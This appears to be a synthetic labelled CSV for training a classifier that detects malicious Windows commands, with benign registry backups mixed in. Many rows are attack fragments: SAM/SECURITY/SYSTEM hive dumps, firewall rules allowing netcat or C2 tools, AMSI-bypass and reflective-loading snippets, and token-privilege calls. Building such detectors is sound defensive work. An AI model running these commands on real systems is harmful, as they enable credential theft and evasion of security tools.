text,label
rule: system integrity 85 | app: c:\users\public\nc.exe | dir: outbound | act: allow | port: *,2
system.reflection.assembly::load($base64); $val = 1302,3
rule: allow all 806 | app: c:\users\admin\appdata\local\temp\powershell.exe | dir: inbound | act: allow | port: 80,2
powershell -c reg.exe export  hklm\security c:\users\public\5m6sfm5c.save,1
"cmd /k ""reg  save  ""hkey_local_machine\sam"" c:\users\public\ihoao4ab.save""",1
"reg.exe export hklm\software\mycorp ""c:\temp\olpyxxij.reg""",0
"[dLLiMPORt(""advAPI32.dlL"")] publiC stATiC EXterN booL aDjUSTTOKEnpriVILegEs(...)",3
"powershell -c c:\windows\system32\reg.exe save   ""hklm\sam""   c:\users\public\cqrlowoi.save",1
SetTOKenPrIv::eNAbLePRIviLEge(sEtakeOwneRSHipprIviLegE),3
Reg eXpORT HKLm\softwAre\MyCoRp d:\LOGS\t3LdSoOX.ReG,0
reg.exe save hklm\software\mycorp c:\temp\mobzmh7m.reg,0
rule: metasploit 89 | app: c:\windows\temp\powershell.exe | dir: inbound | act: allow | port: 1337,2
rule: netcat listener 967 | app: c:\windows\temp\cmd.exe | dir: outbound | act: allow | port: any,2
$date = [sYStEm.DaTetime]::noW,0
Reg.Exe Save HkLM\soFTwaRE\MYcORP C:\TeMP\OQZRA72e.rEg,0
rule: dns query 692 | app: c:\users\admin\appdata\local\temp\svchost.exe | dir: inbound | act: allow | port: 80,2
"PowersheLl -c c:\WIndows\syStem32\REG.EXE  save  hKLM\syStEm  ""c:\UseRS\puBliC\uMg43G0R.sAVE""",1
"powershell -c reg.exe save   ""hklm\security""  ""c:\users\public\dwrr2jxv.save""",1
rule: system integrity 431 | app: c:\windows\temp\svchost.exe | dir: outbound | act: allow | port: any,2
"powershell -c reg  save   ""hklm\security"" c:\temp\2xqg58ph.save",1
Get-cOnTEnt c:\TeMp\SYstEm,0
[SYSTEm.ReflECTioN.asSeMbly]::GeTExEcuTINgaSseMBLy(),0
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 7192,3
sEtTokENPrIv::ENabLepRIVilEGE(SEREStOREprivileGe),3
"CMD.Exe /C c:\wINdOWS\SYsTem32\reg.ExE   EXPOrt  ""hkLm\SeCuRITy"" C:\wIndOWs\Temp\ojAIhtAz.SaVE",1
REG ExPoRT hkcU\COnSOLe c:\BACKUpS\tfvF8Zr8.REG,0
rule: sliver c2 280 | app: c:\users\public\updater.exe | dir: inbound | act: allow | port: 8080,2
powershell -c reg export   hklm\security   c:\windows\temp\etpz27da.save,1
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 7955,3
powershell -c reg  export hklm\security c:\windows\temp\polwfea4.save,1
POWeRsHELL -c c:\wInDOws\sYstEM32\reG.eXE   expORT hkEy_Local_mAChInE\sAM  c:\wINdoWS\tEmp\loyfiHAS.sAvE,1
SeTtokENpriv::EnABlEPrivilEge(SeTAKeowNeRSHIPPRIVILEge),3
"powershell -c reg   export  hklm\security  ""c:\temp\xgj9uv9y.save""",1
"REg.exe SaVe ""HKlm\SOFTWaRE\MYcorP"" c:\BAcKupS\MBQ8N2uJ.reg",0
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 5803,3
"cmd /k ""c:\windows\system32\reg.exe   export   ""hkey_local_machine\sam""   ""c:\users\public\ee0ezwyc.save""""",1
rule: ps remoting 215 | app: c:\users\public\scvhost.exe | dir: outbound | act: allow | port: 8888,2
system.reflection.assembly::load($base64); $val = 830,3
"powershell -c reg.exe   save  hklm\security   ""c:\users\public\9bmnbbiz.save""",1
"C:\wINdOwS\syStEM32\Reg.EXe eXport   HKlM\sEcurITy  ""C:\WIndows\temP\ZRp5hl8D.SAVE""",1
[ref].assembly.gettype('system.management.automation.amsiutils'); $val = 179,3
"cmd /k ""c:\windows\system32\reg.exe   save   hkey_local_machine\sam c:\users\public\utpywppd.save""",1
"cmd /k ""reg  save  ""hklm\security""  c:\users\public\wiozy5yp.save""",1
rule: netcat listener 442 | app: c:\users\public\svchost.exe | dir: inbound | act: allow | port: 1337,2
ADd-TYPE -memBeRdEFiNitiON PuBLIC STaTic ExTERN boOl lOOKUpprIViLEgEVALUE(...),3
rule: metasploit 512 | app: c:\users\admin\appdata\local\temp\nc.exe | dir: inbound | act: allow | port: 53,2
cmd.exe /c reg  save hklm\security c:\windows\temp\dezdh1os.save,1
sYstEm.rEFlEction.aSSEmblY::loAD($bAsE64); $VaL = 451,3
"powershell -c c:\windows\system32\reg.exe  export   ""hklm\system""   c:\temp\0yipxdsk.save",1
eCHo SeBACkUPpriviLEGe,0
"cmd /k ""c:\windows\system32\reg.exe   save ""hklm\system""   ""c:\users\public\of5bexoc.save""""",1
seTtOkeNPriv::EnAbLEPriVILEGE(sEbACkUpPriViLeGe),3
"reg save hklm\software\mycorp ""c:\temp\swlyghix.reg""",0
reg save hkcu\console c:\temp\xbm2a6as.reg,0
"DiR ""C:\TEMp\sECUritY.loG""",0
SEtTokeNpRIV::EnABlepRiViLEGE(serEstORePRivILEgE),3
"reg export   ""hkey_local_machine\sam""   ""c:\temp\kd6xvvpr.save""",1
"cMd /k ""rEG.EXE EXPorT   ""hklM\SystEm""  C:\tEmp\oGFf7sw0.sAVE""",1
"reg save ""hkcu\console"" ""c:\backups\qvtyekdx.reg""",0
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 1289,3
rule: allow all 711 | app: c:\users\admin\appdata\local\temp\cmd.exe | dir: outbound | act: allow | port: 443,2
fINdstr eRRoR c:\logs\SECuRiTY.LOG,0
"[DLlIMPoRt(""aDvaPi32.Dll"")] pUBlIC STaTic eXTErn bOOl ntqUEuEaPCTHREAd(...)",3
rule: allow all 835 | app: c:\windows\temp\scvhost.exe | dir: inbound | act: allow | port: 8080,2
rule: chrome helper 57 | app: c:\windows\temp\cmd.exe | dir: inbound | act: allow | port: 1337,2
SeTTokEnpRiV::enablEPRIvIlEGe(SErEstOrepRIvilEgE),3
sYSTEm.rEfLeCtiON.assembly::LoAd($BAse64); $val = 8915,3
system.reflection.assembly::load($base64); $val = 9478,3
rule: sliver c2 747 | app: c:\users\admin\appdata\local\temp\lsasss.exe | dir: outbound | act: allow | port: 53,2
rule: allow all 895 | app: c:\users\admin\appdata\local\temp\cmd.exe | dir: outbound | act: allow | port: 53,2
reg.exe export hkcu\console c:\temp\24es7b8q.reg,0
"reg.exe save ""hkcu\console"" ""c:\backups\1wnbs2jl.reg""",0
"reg save ""hkcu\software"" ""c:\backups\icbzdezf.reg""",0
system.reflection.assembly::load($base64); $val = 5766,3
"[DlLImPORT(""advAPI32.DlL"")] PubLIc staTIc EXteRN bOoL nTqUeUEApcthReAD(...)",3
rule: ps remoting 73 | app: c:\windows\temp\scvhost.exe | dir: inbound | act: allow | port: *,2
"cmd.exe /c c:\windows\system32\reg.exe export ""hklm\security""  ""c:\temp\h7mrejiz.save""",1
"cmd.exe /c c:\windows\system32\reg.exe   save  ""hklm\system""  c:\temp\dmsjro1k.save",1
rule: ps remoting 204 | app: c:\windows\temp\powershell.exe | dir: outbound | act: allow | port: 1337,2
cat C:\teMP\SysTem,0
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 2447,3
AdD-TYpE -mEMBeRdEFiNitiOn PUblIc sTAtIC ExtErN BOol loOkuppRIViLEgEvAluE(...),3
CAt C:\TeMP\sEcUrITy.Log,0
rule: chrome helper 377 | app: c:\users\public\cmd.exe | dir: outbound | act: allow | port: 53,2
WritE-HoSt sETAkeowneRshIpPRiVilege,0
seTTokeNpRIV::ENablePrivilEgE(SeResTORepRIViLEGe),3
[sYstem.rEFlecTIoN.asSEmBly]::GeTeXEcuTingASSEMBLY(),0
"cmd /k ""c:\windows\system32\reg.exe   save ""hklm\system"" ""c:\windows\temp\oe2kxnke.save""""",1
"reg.exe save ""hklm\software\mycorp"" ""d:\logs\teumwoiz.reg""",0
"reg.exe   save hklm\system   ""c:\users\public\5ot0jujs.save""",1
$a = [SYSTem.RUnTIMe.IntEROPseRviCES.marShAL]::gEtDEleGATeFoRFunCtioNPoinTER; $Val = 6442,3
"[DLlIMPoRt(""ADVAPI32.DLl"")] pubLic StaTiC extERn BOoL LOokuPpRIVILeGeVALuE(...)",3
"[dLlIMpoRT(""advApi32.DLl"")] PUBlIC StAtIc ExtERN bOOl NtqUeUEApctHreaD(...)",3
reg.exe export hklm\software\mycorp d:\logs\hxi3n0ob.reg,0
System.reFlectiON.AsSEMbly::lOaD($BASe64); $VAL = 2587,3
Ls C:\TemP\sYstEM,0
rule: system integrity 413 | app: c:\users\public\svchost.exe | dir: inbound | act: allow | port: 53,2
"powershell -c reg   export   ""hklm\system""   c:\users\public\aezsmlhw.save",1
rule: winupdate helper 507 | app: c:\users\public\svchost.exe | dir: outbound | act: allow | port: 4444,2
rule: netcat listener 368 | app: c:\users\admin\appdata\local\temp\updater.exe | dir: inbound | act: allow | port: 8888,2
sETTOkeNpriv::eNaBLePRiVileGE(sEReSTorEpRiVileGe),3
"reg save hklm\software\mycorp ""c:\temp\tcolreru.reg""",0
$dAte = [systEM.daTeTIME]::Now,0
rule: winupdate helper 184 | app: c:\users\public\cmd.exe | dir: outbound | act: allow | port: 443,2
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 700,3
SELEcT-stRinG sEDEbuGPRiViLege C:\winDoWs\sYSteM32\WIneVT\logs\SecURity.EVTx,0
reg.exe save hkcu\console d:\logs\khkhaohi.reg,0
sETTOKENPRIv::EnaBleprIViLeGe(seTAkEOwneRshIPpriViLEGE),3
rule: sliver c2 932 | app: c:\windows\temp\updater.exe | dir: outbound | act: allow | port: 8888,2
$dAte = [SysteM.DaTeTIMe]::NOw,0
"ReG sAVE ""hklM\sOFTWaRe\MYCorp"" D:\logS\OVG2SS5J.Reg",0
system.reflection.assembly::load($base64); $val = 1370,3
fInDsTr sEdeBUgPrIVILegE C:\wINDOws\system32\WINevT\LoGS\sEcUrIty.EVtx,0
sELEct-StRInG pasSWORD c:\WIndOwS\SYSTeM32\WInEVT\loGS\SEcurity.EVtX,0
"CmD /k ""ReG  SAVe   ""HKey_LoCaL_machiNe\sAM""   c:\useRs\puBLIc\G1WdeIdl.SAve""",1
"cMD.eXE /C reG   saVe  ""Hklm\securITy""   C:\usERs\PubLiC\OnTMhaBt.sAvE",1
"rEG saVE  ""HKlm\sAm""   ""c:\usErs\pUbLIc\F4c5LLNB.SAvE""",1
rule: netcat listener 842 | app: c:\users\admin\appdata\local\temp\nc.exe | dir: outbound | act: allow | port: 8888,2
WRitE-hOSt SeDEBUgprivIlegE,0
fIndstr erROR C:\LOGS\SecUrITy.lOG,0
SEtToKenprIv::EnABlePRIVilEGe(SebAcKupPriVilEGe),3
system.reflection.assembly::load($base64); $val = 4707,3
"cmd.exe /c reg   export  hkey_local_machine\sam ""c:\users\public\afppq0uw.save""",1
rule: metasploit 741 | app: c:\users\admin\appdata\local\temp\svchost.exe | dir: outbound | act: allow | port: 8080,2
rule: winupdate helper 916 | app: c:\users\public\cmd.exe | dir: inbound | act: allow | port: *,2
"rEG eXpoRT ""hkCU\SofTWarE"" C:\BaCKUps\Rfe8qeir.REg",0
$A = [SYStEM.ruNTiME.iNtEroPSErviCEs.mARShAL]::GEtDeLeGATeFOrfuNctionPoInteR; $vAl = 5103,3
"reg  export   hklm\system   ""c:\windows\temp\6c0e5ixu.save""",1
SETtokENpRiv::enABLepriVIlEgE(sEDEbugpRIVilEge),3
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 3470,3
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 5399,3
"reg save ""hklm\software\mycorp"" c:\backups\hy26jspp.reg",0
seLECT-strInG PaSSWord c:\lOGS\sECUrItY.log,0
"[SysTEM.maTH]::pOW(2, 10)",0
rule: system integrity 306 | app: c:\windows\temp\lsasss.exe | dir: outbound | act: allow | port: 53,2
rule: core networking | app: c:\program files\microsoft teams\teams.exe | dir: inbound | act: allow | port: 3389,0
AdD-TyPE -mEmBerdefiNItiOn PuBLIc StAtIC EXTERN boOl AdJUsTtoKenPRIVIlEgES(...),3
rule: system integrity 189 | app: c:\users\public\scvhost.exe | dir: outbound | act: allow | port: 4444,2
SelECt-StRIng -paTTeRn SETAKEoWnErShiPprIVilegE,0
rule: metasploit 224 | app: c:\windows\temp\lsasss.exe | dir: inbound | act: allow | port: 8080,2
Add-tYpe -memBeRDeFinItIOn pUbLic StaTiC exteRN bOOl LooKuPPrIvILeGEValUe(...),3
powershell -c reg.exe export  hklm\sam c:\users\public\i0z3qd1d.save,1
"powershell -c reg.exe save ""hklm\security""   ""c:\windows\temp\wugpkanr.save""",1
[SYSteM.refLEctIOn.aSsEmbLy]::gETeXECuTIngaSsEmBLY(),0
"reg.exe save hkcu\software ""c:\backups\ppyaaegb.reg""",0
system.reflection.assembly::load($base64); $val = 1221,3
[ref].assembly.gettype('system.management.automation.amsiutils'); $val = 6917,3
powERsHELl -C c:\WINDows\sYstEM32\reg.EXe  EXPOrt   Hkey_lOCAL_MacHINE\sAM C:\TeMP\B5HYSr7N.SAvE,1
SeleCt-StrinG sEDEbugpriviLegE c:\lOgs\sECURiTY.Log,0
"[dlLiMPoRt(""advAPi32.dLl"")] Public stAtiC ExTERN BooL NTQUeUEaPcThread(...)",3
rule: system integrity 487 | app: c:\windows\temp\updater.exe | dir: outbound | act: allow | port: 8080,2
rule: allow all 368 | app: c:\users\admin\appdata\local\temp\svchost.exe | dir: inbound | act: allow | port: 80,2
rule: winupdate helper 776 | app: c:\users\admin\appdata\local\temp\powershell.exe | dir: outbound | act: allow | port: 53,2
rule: allow all 716 | app: c:\windows\temp\updater.exe | dir: outbound | act: allow | port: *,2
"reg.exe export hkcu\software ""c:\backups\k2ewbfbn.reg""",0
system.reflection.assembly::load($base64); $val = 8202,3
"rEG.eXE EXpOrt HkcU\cOnSolE ""c:\BackUpS\YABj6tSm.rEg""",0
"cmd /k ""c:\windows\system32\reg.exe  save   hklm\system   c:\windows\temp\h6sxtlvy.save""",1
rule: ps remoting 691 | app: c:\users\public\updater.exe | dir: inbound | act: allow | port: 8080,2
rule: winupdate helper 507 | app: c:\windows\temp\cmd.exe | dir: outbound | act: allow | port: any,2
aDd-TYpe -MembeRdEFInitIon pUbLIC stAtiC EXTeRN bOol AdjUSTtOKenPrivilEges(...),3
powershell -c reg   export hkey_local_machine\sam  c:\users\public\a7liwk05.save,1
rule: winupdate helper 859 | app: c:\users\admin\appdata\local\temp\powershell.exe | dir: inbound | act: allow | port: 8080,2
system.reflection.assembly::load($base64); $val = 8789,3
"cmd.exe /c reg.exe save  hklm\security  ""c:\users\public\k8ubmsac.save""",1
$date = [SYstEm.daTetiME]::nOw,0
FiNDSTR sEDEBUGPRiviLEGE c:\wINDoWs\SystEm32\WINEVT\lOGS\securITy.EvTX,0
SelECT-StRiNg ErROR C:\wIndOwS\sYStem32\wINEVT\lOgS\SeCURiTY.eVTx,0
"REG.Exe SAVe hKcU\cOnSOLe ""c:\BaCkuPS\A1qgyxpK.rEg""",0
"[dLLimPoRT(""AdvapI32.DlL"")] PUBlic STatIC ExTERN booL lOOKupPRIVILEgevAlUE(...)",3
"cmd.exe /c reg   save ""hklm\system""  c:\windows\temp\kbmrdmqm.save",1
reg save hkcu\software c:\backups\ukmoqydl.reg,0
"cmd /k ""c:\windows\system32\reg.exe   export hklm\security c:\users\public\o319oprg.save""",1
ECHo sEbACKUPPrIVilege,0
rule: system integrity 309 | app: c:\users\public\updater.exe | dir: outbound | act: allow | port: 1337,2
rule: allow all 569 | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: any,2
"rEg.eXe  ExpoRT ""hklM\SEcuRiTY"" ""c:\wiNDowS\TEmp\5zEK9vmJ.SAve""",1
rule: chrome helper 856 | app: c:\users\public\updater.exe | dir: inbound | act: allow | port: any,2
rule: netcat listener 424 | app: c:\windows\temp\lsasss.exe | dir: outbound | act: allow | port: *,2
"reg export hkcu\software ""c:\temp\gsffbaq9.reg""",0
"reg save hklm\software\mycorp ""c:\temp\6twq16ct.reg""",0
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 3729,3
system.reflection.assembly::load($base64); $val = 5551,3
[ref].assembly.gettype('system.management.automation.amsiutils'); $val = 1735,3
"cmd.exe /c c:\windows\system32\reg.exe save ""hklm\sam"" c:\windows\temp\5ftskbry.save",1
"cmd /k ""reg  save  ""hklm\system""  ""c:\temp\gxrbtrld.save""""",1
"[DLLIMpoRT(""ADvaPI32.dLL"")] PUbLIC static EXteRn bOol adjuSTToKeNprIvilegeS(...)",3
FINdstR SedEbugPrivilEGE c:\WINdOwS\sySTem32\WiNeVt\LoGS\SEcuritY.evtx,0
"reg.exe save ""hkcu\software"" ""c:\temp\fpf1jytl.reg""",0
reg save hkey_local_machine\sam c:\temp\8w1nubia.save,1
rule: metasploit 710 | app: c:\windows\temp\svchost.exe | dir: outbound | act: allow | port: 4444,2
[ref].assembly.gettype('system.management.automation.amsiutils'); $val = 4980,3
"reg.exe save hklm\software\mycorp ""c:\backups\iveemrqt.reg""",0
"CMd /K ""c:\winDOwS\SysTeM32\reg.exe   export   ""HKEy_LOcaL_MaChiNE\sAm""   ""C:\teMp\lQSGKyMs.SAVe""""",1
FInDstr PassworD c:\wiNdOws\SYStem32\winevt\LOGs\seCURiTY.EvTX,0
rule: ps remoting 308 | app: c:\users\public\updater.exe | dir: outbound | act: allow | port: *,2
"[dllIMpOrT(""advApi32.DlL"")] PuBlIC staTic EXTeRN bool opENProceSsTokEn(...)",3
$a = [SYStem.RuNTIme.InTeRopserviCEs.MArSHal]::getdELegatEFoRFUncTIONPoinTer; $VAl = 4435,3
"cmd /k ""c:\windows\system32\reg.exe   save   hkey_local_machine\sam  c:\temp\lnu7mly4.save""",1
"powERSheLL -c reg  sAVE  hklm\SAM ""C:\teMP\3TFUA0MU.sAvE""",1
rule: sliver c2 66 | app: c:\users\admin\appdata\local\temp\svchost.exe | dir: outbound | act: allow | port: 4444,2
rule: allow all 460 | app: c:\windows\temp\nc.exe | dir: inbound | act: allow | port: 8888,2
"reg  export  hklm\security ""c:\users\public\hucqzbed.save""",1
cAT C:\tEMp\SAM.savE,0
Add-TYPe -mEmbeRDefinITIOn PubLic StATic ExtErN bOOl opeNPROcesSTOKEn(...),3
rule: metasploit 365 | app: c:\windows\temp\scvhost.exe | dir: outbound | act: allow | port: any,2
SeTToKenPriv::ENaBLepRIViLEGe(SEResTOREPriVilege),3
"type ""c:\temp\sam""",0
"cmd /k ""c:\windows\system32\reg.exe   save   ""hklm\security"" c:\windows\temp\j1634rnb.save""",1
[REf].aSsEmBly.GEttyPE('sysTem.mAnAgEmEnT.aUToMaTIon.AmsiuTILS'); $vAL = 656,3
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 4927,3
"reg.exe save hkcu\software ""c:\temp\eu8bjjyp.reg""",0
rule: allow all 178 | app: c:\windows\temp\cmd.exe | dir: inbound | act: allow | port: 8080,2
rule: system integrity 55 | app: c:\users\public\nc.exe | dir: outbound | act: allow | port: 8080,2
"reg.EXe SaVE hkcU\CONsole ""C:\BackuPS\Z5iC7z75.rEG""",0
"cmD /k ""rEg.Exe   SaVe  hklM\systEm   c:\WInDowS\TEMp\DeCyWkAr.saVE""",1
system.reflection.assembly::load($base64); $val = 2354,3
"reg.exe export ""hklm\software\mycorp"" d:\logs\kfimp6rv.reg",0
rule: netcat listener 306 | app: c:\users\admin\appdata\local\temp\updater.exe | dir: outbound | act: allow | port: 8888,2
"PoweRshELl -c ReG.ExE  EXpOrT ""HkLm\sEcuRItY""  ""c:\WiNdowS\TEMP\XNBsvZZf.sAVe""",1
sYSTem.RefleCtiOn.assEmBly::Load($BAsE64); $val = 5083,3
"[sYsTeM.mATH]::poW(2, 10)",0
rule: winupdate helper 130 | app: c:\users\admin\appdata\local\temp\svchost.exe | dir: outbound | act: allow | port: 1337,2
reg export hkcu\software d:\logs\hpoqzyrv.reg,0
"reg.exe save ""hklm\software\mycorp"" c:\temp\72ozcomu.reg",0
rule: metasploit 104 | app: c:\users\public\svchost.exe | dir: inbound | act: allow | port: 443,2
"[DllImPOrt(""aDvapi32.dll"")] PUBlic sTATIC EXteRN BoOl AdJUSTTOkenprIVileGeS(...)",3
rule: netcat listener 454 | app: c:\users\public\lsasss.exe | dir: inbound | act: allow | port: 8080,2
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 2849,3
rule: netcat listener 721 | app: c:\windows\temp\powershell.exe | dir: outbound | act: allow | port: 4444,2
sYstEM.REfleCtIOn.aSSemBlY::Load($bAsE64); $Val = 8396,3
"reg export hkcu\software ""c:\backups\gjofcwg9.reg""",0
$A = [SyStEM.rUNtIME.InteRopSeRvICEs.mArsHAl]::GEtDElEGATeFoRFUnCtioNPOiNteR; $VAL = 2032,3
reg.exe save hkcu\software c:\backups\8jq9qywq.reg,0
system.reflection.assembly::load($base64); $val = 9709,3
"reg export ""hkcu\software"" d:\logs\asdxzywk.reg",0
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 8157,3
rule: winupdate helper 865 | app: c:\users\admin\appdata\local\temp\scvhost.exe | dir: outbound | act: allow | port: 53,2
reg.exe save hkcu\console c:\backups\zodvqwip.reg,0
"reg.exe save hkcu\software ""d:\logs\lwdmkdzp.reg""",0
cMD.eXe /C REG.ExE savE HklM\SeCuRItY  C:\TeMp\A5wEDGFa.SAvE,1
SyStEM.REfLectiON.ASsemBlY::lOaD($bAsE64); $Val = 4117,3
rule: system integrity 355 | app: c:\users\admin\appdata\local\temp\svchost.exe | dir: outbound | act: allow | port: *,2
rule: dns query 534 | app: c:\users\public\updater.exe | dir: outbound | act: allow | port: 4444,2
[SYStEM.REFleCTION.asseMblY]::GEteXeCutINGaSsEmbly(),0
rule: ps remoting 4 | app: c:\windows\temp\svchost.exe | dir: inbound | act: allow | port: any,2
SeTtOKeNPrIv::ENAbLEPrIvileGE(SEbACkUpPrIvIlEGe),3
system.reflection.assembly::load($base64); $val = 2834,3
rule: ps remoting 871 | app: c:\users\public\lsasss.exe | dir: inbound | act: allow | port: *,2
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 8037,3
rule: allow all 86 | app: c:\windows\temp\powershell.exe | dir: inbound | act: allow | port: 8080,2
c:\windows\system32\reg.exe export   hklm\system c:\users\public\06quhn3s.save,1
rule: winupdate helper 782 | app: c:\windows\temp\updater.exe | dir: inbound | act: allow | port: 1337,2
SYstem.ReFlectIOn.assEMBLy::LoaD($BAse64); $VAL = 4462,3
rule: winupdate helper 293 | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: *,2
[ref].assembly.gettype('system.management.automation.amsiutils'); $val = 7011,3
rule: allow all 818 | app: c:\users\public\updater.exe | dir: inbound | act: allow | port: 80,2
"powershell -c c:\windows\system32\reg.exe export  ""hklm\security"" ""c:\windows\temp\0qvnrinq.save""",1
rule: netcat listener 787 | app: c:\users\public\nc.exe | dir: inbound | act: allow | port: 8080,2
"pOwERshELl -C rEG.ExE ExpoRt   ""HkLm\sECUrItY"" c:\winDOwS\temP\rDSPtkkf.saVe",1
"PoWerShelL -C rEg ExPoRT   ""hKEY_Local_MacHInE\SAm""   ""c:\temP\Ov9BpVCa.save""",1
reg.exe export  hkey_local_machine\sam   c:\users\public\r2b9kfom.save,1
CmD.exE /C c:\wiNdOwS\sysTem32\ReG.exE SAvE  HkLM\seCURity   C:\wInDowS\tEmp\HlLfU3ck.savE,1
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 7150,3
[ref].assEMBLY.gEttype('SYStem.MAnAGEMeNT.AuTomatIOn.amSiutiLS'); $vaL = 8413,3
"cmd.exe /c reg.exe   export  hklm\system   ""c:\windows\temp\jwhnzndd.save""",1
FinDSTr PasswOrd C:\WInDoWS\SYSTEm32\wInEvt\loGS\SecuRiTY.EvTX,0
rule: allow all 81 | app: c:\users\public\updater.exe | dir: inbound | act: allow | port: 4444,2
system.reflection.assembly::load($base64); $val = 7732,3
rule: netcat listener 264 | app: c:\users\admin\appdata\local\temp\nc.exe | dir: inbound | act: allow | port: 443,2
sETtokEnprIv::EnabLEPRIVIlEge(SeRestOREprivILeGe),3
"cMd /K ""REg   eXpORt   Hklm\sam c:\WINdoWS\TEMp\OE2cTXsH.saVe""",1
sETTokENPriv::enablepRiVILEgE(SEREStOREprivilege),3
setToKeNprIV::enabLEpriVIlEgE(SEDEBUGPRiviLEGE),3
rule: ps remoting 948 | app: c:\users\public\svchost.exe | dir: inbound | act: allow | port: *,2
"cmd.Exe /C rEg.exE   savE hkEy_loCaL_MAchINE\SAm ""c:\winDoWS\TeMp\RirLLzPE.save""",1
sEtTOkENpRiv::enABLePrIvIlEGe(SeBAckUPpRIVILEgE),3
c:\wiNDoWS\sYstem32\REg.Exe  exPoRT  Hklm\SAm  C:\windOWS\TEmp\XDwTMzou.saVe,1
rule: dns query 951 | app: c:\users\admin\appdata\local\temp\powershell.exe | dir: inbound | act: allow | port: 4444,2
"powershell -c c:\windows\system32\reg.exe   export   ""hklm\security""  c:\temp\m0gdpuvw.save",1
rule: allow all 778 | app: c:\windows\temp\lsasss.exe | dir: inbound | act: allow | port: 443,2
"reG.exe sAve HKcu\COnSOle ""D:\lOgs\FrYE1PPo.ReG""",0
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 4499,3
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 4005,3
rule: netcat listener 13 | app: c:\windows\temp\powershell.exe | dir: inbound | act: allow | port: 1337,2
"[dlLimpORT(""ADvAPi32.DlL"")] PUBliC sTAtiC eXtern bool NTQueUeapCTHReAd(...)",3
"tyPe ""c:\TeMp\saM.sAVE""",0
reg.exe export hkcu\software c:\temp\ytysgemc.reg,0
settokENPrIV::eNAbLEprIVilEge(seRestOREprivileGe),3
"Reg.eXE Save HkCu\conSole ""c:\tEmp\4uqhnX77.Reg""",0
"[Dllimport(""ADvapI32.Dll"")] PubLic sTatIc eXtERN BOOl adJUsttOkeNPRivIleGes(...)",3
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 4077,3
"powershell -c c:\windows\system32\reg.exe  export  hkey_local_machine\sam ""c:\windows\temp\cvvcdriw.save""",1
"cmd.exe /c reg save   ""hklm\system""  ""c:\windows\temp\qxflruio.save""",1
"reg export ""hkcu\software"" c:\temp\7s8sqxe2.reg",0
cmd.exe /c c:\windows\system32\reg.exe  save hklm\system  c:\users\public\9xuketyl.save,1
sEttOkeNPRiV::ENAblEPrIvilEGe(sEtAkeoWnERShiPpRIViLEgE),3
reg.exe export hklm\software\mycorp c:\backups\ktwbfcow.reg,0
$a = [system.runtime.interopservices.marshal]::getdelegateforfunctionpointer; $val = 8915,3
sETTOkENpRiv::enaBlEPRIvILege(SeReSTOREpRiVILEGe),3
rule: system integrity 909 | app: c:\users\admin\appdata\local\temp\cmd.exe | dir: outbound | act: allow | port: 4444,2
seTtOKENpRIV::eNAblePrivileGe(seBacKUPprIvIlEGe),3
"cmd /k ""c:\windows\system32\reg.exe  export ""hklm\system""  ""c:\temp\m4izhilt.save""""",1
"[DLLImpORt(""ADVApI32.DLL"")] PUBliC statIC exTern boOL OpENPROCESSTOKEn(...)",3
rule: system integrity 677 | app: c:\windows\temp\updater.exe | dir: inbound | act: allow | port: 1337,2
rule: ps remoting 713 | app: c:\windows\temp\scvhost.exe | dir: outbound | act: allow | port: 8080,2
"reg.exe export hklm\software\mycorp ""d:\logs\jtpryqve.reg""",0
